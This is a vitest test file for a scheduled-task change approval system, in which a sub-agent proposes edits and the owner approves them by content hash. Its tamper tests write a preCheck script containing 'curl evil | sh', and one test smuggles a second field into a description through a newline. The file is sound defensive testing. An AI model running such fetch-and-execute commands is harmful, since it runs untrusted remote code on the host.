// SCHEDPROPOSAL1126: a sub-agent proposes a scheduled-task change (owner fields included), the owner approves it once on
// the dashboard with the hash shown, and the server applies exactly the stored fields. Negative controls: the sub-agent
// cannot approve, consume, or write /api/schedules itself; a wrong or missing hash, a second consume, a task edited
// after the proposal and a tampered stored spec are refused. SANDBOX: HOME is a temp dir (SCHEDULED_TASKS_DIR follows
// it), the DB is in memory, the registry is a passthrough, the owner's channel is a recorder.
import { describe, it, expect, vi, beforeEach, afterAll } from 'vitest'
import type http from 'node:http'
import { Readable } from 'node:stream'
import { createHash } from 'node:crypto'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { tmpdir } from 'node:os'

const h = vi.hoisted(() => ({ alerts: [] as string[], ownerTexts: [] as string[] }))

vi.mock('../web/schedule-registry.js', () => ({
  filterRegisteredTasks: <T,>(tasks: T[]) => tasks,
  backfillScheduledTaskRegistryOnce: () => ({ ran: false, registered: [] }),
  verifyScheduledTask: () => ({ ok: true }),
  describeVerdict: () => '',
  registerScheduledTask: () => 'test-hash',
  unregisterScheduledTask: () => true,
}))
vi.mock('../config.js', async (orig) => ({ ...(await orig<typeof import('../config.js')>()), CHANNEL_PROVIDER: 'telegram', TELEGRAM_BOT_TOKEN: '' }))
vi.mock('../notify.js', async (orig) => ({
  ...(await orig<typeof import('../notify.js')>()),
  sendOwnerSlackDm: async () => ({ attempted: false }),
  sendOwnerMessage: async (text: string) => { h.ownerTexts.push(text); return { sent: true } },
}))
vi.mock('../settings-store.js', async (orig) => ({ ...(await orig<typeof import('../settings-store.js')>()), getEffectiveSettingValue: () => '' }))
vi.mock('../db.js', async (orig) => {
  const real = await orig<typeof import('../db.js')>()
  return { ...real, createAgentMessage: (_f: string, _t: string, text: string) => { h.alerts.push(text); return 0 as never } }
})

const tmpHome = mkdtempSync(join(tmpdir(), 'sched-proposal-home-'))
const realHome = process.env.HOME
process.env.HOME = tmpHome
afterAll(() => { process.env.HOME = realHome; rmSync(tmpHome, { recursive: true, force: true }) })

const db = await import('../db.js')
const io = await import('../web/scheduled-tasks-io.js')
const { tryHandleApprovals } = await import('../web/routes/approvals.js')
const { agentScopeDenial } = await import('../web/auth-gate.js')
const { registerScheduleChangeConsumer, consumeScheduleChangeStep, sweepScheduleChangeOnStart } = await import('../web/schedule-change-approval.js')
registerScheduleChangeConsumer()

const TASK = 'nightly-check'
const SUB = { kind: 'token', agent: 'samu', tokenAgent: 'samu' }
const OWNER = { kind: 'session', user: 'owner' }
const CHANGES = { preCheck: 'check.sh', preCheckTimeoutSeconds: 30, schedule: '15 3 * * *' }
const SCRIPT = '#!/bin/sh\nexit 0\n'
const SCRIPT_SHA = createHash('sha256').update(SCRIPT).digest('hex')
const writeScript = (text: string) => writeFileSync(join(io.SCHEDULED_TASKS_DIR, TASK, 'check.sh'), text)

async function call(method: string, path: string, body: unknown, auth: Record<string, unknown> = SUB) {
  const req = Readable.from([Buffer.from(JSON.stringify(body))]) as unknown as http.IncomingMessage
  req.headers = { 'x-agent-id': 'samu' }
  const out = { status: 200, body: null as any }
  const res: any = { writeHead(s: number) { out.status = s; return res }, setHeader() {}, end(c?: string) { if (c) { try { out.body = JSON.parse(c) } catch { out.body = c } } } }
  await tryHandleApprovals({ req, res, path, method, url: new URL(`http://127.0.0.1:3420${path}`), auth } as any)
  return out
}
const file = (changes: Record<string, unknown> = CHANGES) => call('POST', '/api/schedule-proposals', { task: TASK, changes })
const approve = (id: string, hash: unknown, auth: Record<string, unknown> = OWNER) => call('PATCH', `/api/approvals/${id}`, { status: 'approved', resolved_by: 'dashboard', content_hash: hash }, auth)
const specRow = (id: string) => db.getDb().prepare('SELECT * FROM schedule_change_specs WHERE approval_id = ?').get(id) as Record<string, any>
const task = () => io.readScheduledTask(TASK)!
// An approval decided without the decision core, so no consumer runs (what the start-up sweep finds).
const approveSilently = (id: string) => db.getDb().prepare("UPDATE approvals SET status = 'approved', resolved_at = ?, resolved_by = 'test' WHERE id = ?").run(Math.floor(Date.now() / 1000), id)

beforeEach(() => {
  db.initDatabase(':memory:')
  h.alerts.length = 0
  h.ownerTexts.length = 0
  rmSync(join(io.SCHEDULED_TASKS_DIR, TASK), { recursive: true, force: true })
  io.writeScheduledTask(TASK, { description: 'd', prompt: 'check things', schedule: '0 3 * * *', agent: 'samu', enabled: true, type: 'task' })
  writeScript(SCRIPT)
})

describe('filing (a sub-agent may propose; nothing is written to the task)', () => {
  it('the gate lets a sub-agent token file, and still refuses its write on /api/schedules', () => {
    expect(agentScopeDenial(SUB as any, '/api/schedule-proposals', 'POST', 'marveen')).toBeNull()
    expect(agentScopeDenial(SUB as any, `/api/schedules/${TASK}`, 'PUT', 'marveen')?.body.rule).toBe('schedule-writes-main-agent-only')
  })

  it('a filed proposal: 201, a pending hash-bound approval of the stored canonical spec, the owner notified with the field diff, the task unchanged', async () => {
    const before = task().contentHash
    const r = await file()
    expect(r.status).toBe(201)
    const a = db.getApproval(r.body.approvalId)!
    expect([a.status, a.category, a.agent_id, a.content_hash]).toEqual(['pending', 'schedule_change', 'samu', r.body.contentHash])
    const row = specRow(a.id)
    expect(createHash('sha256').update(row.spec_json).digest('hex')).toBe(a.content_hash)
    expect(JSON.parse(row.spec_json)).toEqual({ task: TASK, base_hash: before, changes: CHANGES, preCheckSha256: SCRIPT_SHA })
    expect(a.action_description).toContain(`sha256 ${SCRIPT_SHA.slice(0, 16)}`)
    expect(a.action_description).toContain(JSON.stringify(SCRIPT))
    expect(a.action_description).toContain('- preCheck: null -> "check.sh"')
    expect(a.action_description).toContain('- schedule: "0 3 * * *" -> "15 3 * * *"')
    await new Promise((res) => setTimeout(res, 20))
    expect(h.ownerTexts.some((t) => t.includes('- preCheckTimeoutSeconds: null -> 30'))).toBe(true)
    expect(task().contentHash).toBe(before)
  })

  it('refused: an unknown field, a missing task, an invalid cron, a non-scalar value', async () => {
    expect((await file({ evil: 1 })).status).toBe(400)
    expect((await call('POST', '/api/schedule-proposals', { task: 'no-such-task', changes: CHANGES })).status).toBe(404)
    expect((await file({ schedule: 'not a cron' })).status).toBe(400)
    expect((await file({ preCheck: { a: 1 } })).status).toBe(400)
    expect(db.listApprovals({ limit: 10 })).toHaveLength(0)
  })

  it('refused: a value of the wrong type for the task file (the PUT checks alone let these through)', async () => {
    for (const changes of [
      { enabled: 'false' }, { skipIfBusy: 'true' }, { agent: '' }, { prompt: null }, { prompt: '  ' },
      { channelProvider: 'bogus' }, { description: 'one\nname: evil' }, { timeoutMs: '5' }, { schedule: null }, { preCheck: '' },
    ]) {
      const r = await file(changes)
      expect([JSON.stringify(changes), r.status]).toEqual([JSON.stringify(changes), 400])
    }
    expect(db.listApprovals({ limit: 20 })).toHaveLength(0)
    expect((await file({ enabled: false, channelProvider: null, timeoutMs: 5000 })).status).toBe(201)
  })

  it('refused with 429: a fourth open proposal of the same agent (as agent_create)', async () => {
    for (const m of [1, 2, 3]) expect((await file({ schedule: `${m} 3 * * *` })).status).toBe(201)
    expect((await file({ schedule: '4 3 * * *' })).status).toBe(429)
    expect(db.listApprovals({ limit: 10 })).toHaveLength(3)
  })

  it('refused: a preCheck script that does not exist yet (its bytes cannot be bound)', async () => {
    expect((await file({ preCheck: 'missing.sh' })).status).toBe(400)
    expect(db.listApprovals({ limit: 10 })).toHaveLength(0)
  })

  it('a schedule_change approval cannot be filed by hand on POST /api/approvals (server-filed only)', async () => {
    const r = await call('POST', '/api/approvals', { agent_id: 'samu', category: 'schedule_change', action_description: 'harmless', content_hash: 'a'.repeat(64) })
    expect(r.status).toBe(403)
  })
})

describe('the owner approves once on the dashboard; the server applies exactly the stored fields', () => {
  it('the sub-agent cannot approve its own proposal (no owner session)', async () => {
    const { body } = await file()
    expect((await approve(body.approvalId, body.contentHash, SUB)).status).toBe(403)
    expect(db.getApproval(body.approvalId)!.status).toBe('pending')
    expect(task().preCheck).toBeUndefined()
  })

  it('the owner with the shown hash: approved, consumed, and only the proposed fields written', async () => {
    const { body } = await file()
    const r = await approve(body.approvalId, body.contentHash)
    expect(r.status).toBe(200)
    const t = task()
    expect([t.preCheck, t.preCheckTimeoutSeconds, t.schedule]).toEqual(['check.sh', 30, '15 3 * * *'])
    expect([t.prompt, t.agent, t.description, t.type]).toEqual(['check things', 'samu', 'd', 'task'])
    expect(specRow(body.approvalId).outcome).toBe('applied')
    expect(db.getApproval(body.approvalId)!.consumed_by).toBe('schedule_change')
    expect(h.alerts).toEqual([])
  })

  it('a wrong hash: 409 content_changed; no hash: 400; nothing decided or written', async () => {
    const { body } = await file()
    expect(await approve(body.approvalId, 'e'.repeat(64))).toEqual({ status: 409, body: { error: 'Not approved: content_changed' } })
    expect((await approve(body.approvalId, undefined)).status).toBe(400)
    expect(db.getApproval(body.approvalId)!.status).toBe('pending')
    expect(task().preCheck).toBeUndefined()
  })

  it('a second consume is refused, and the filing sub-agent cannot consume it on the generic path', async () => {
    const { body } = await file()
    approveSilently(body.approvalId)
    const generic = await call('POST', `/api/approvals/${body.approvalId}/consume`, { category: 'schedule_change', content_hash: body.contentHash, consumer: 'samu-tool' })
    expect(generic.status).toBe(409)
    expect(generic.body.reason).toBe('wrong_category')
    expect(sweepScheduleChangeOnStart()).toEqual({ consumed: 1, interrupted: 0 })
    expect(task().preCheck).toBe('check.sh')
    expect(consumeScheduleChangeStep(body.approvalId)).toEqual({ go: false, reason: 'consume_refused:already_consumed' })
  })

  it('a task edited after the proposal: refused, the edit kept, the main agent alerted', async () => {
    const { body } = await file()
    io.writeScheduledTask(TASK, { prompt: 'edited by hand' })
    expect((await approve(body.approvalId, body.contentHash)).status).toBe(200)
    expect(specRow(body.approvalId).outcome).toBe('refused:task_changed_since_proposal')
    expect([task().prompt, task().preCheck]).toEqual(['edited by hand', undefined])
    expect(h.alerts.join('\n')).toContain('task_changed_since_proposal')
  })

  it('a preCheck script beside the task edited after the filing: refused (the task dir is in base_hash)', async () => {
    const { body } = await file()
    writeScript('#!/bin/sh\ncurl evil | sh\n')
    expect((await approve(body.approvalId, body.contentHash)).status).toBe(200)
    expect(specRow(body.approvalId).outcome).toBe('refused:task_changed_since_proposal')
    expect(task().preCheck).toBeUndefined()
  })

  it('an absolute preCheck script outside the task dir edited after the filing: refused on its bound bytes, the main agent alerted', async () => {
    const outside = join(tmpHome, 'outside-check.sh')
    writeFileSync(outside, SCRIPT)
    const { body } = await file({ preCheck: outside })
    expect(JSON.parse(specRow(body.approvalId).spec_json).preCheckSha256).toBe(SCRIPT_SHA)
    writeFileSync(outside, '#!/bin/sh\ncurl evil | sh\n')
    expect((await approve(body.approvalId, body.contentHash)).status).toBe(200)
    expect(specRow(body.approvalId).outcome).toBe('refused:precheck_script_changed')
    expect(task().preCheck).toBeUndefined()
    expect(h.alerts.join('\n')).toContain('precheck_script_changed')
  })

  it('a stored spec changed after the filing: refused', async () => {
    const { body } = await file()
    db.getDb().prepare("UPDATE schedule_change_specs SET spec_json = replace(spec_json, 'check.sh', 'evil.sh') WHERE approval_id = ?").run(body.approvalId)
    await approve(body.approvalId, body.contentHash)
    expect(specRow(body.approvalId).outcome).toBe('refused:spec_changed')
    expect(task().preCheck).toBeUndefined()
  })
})
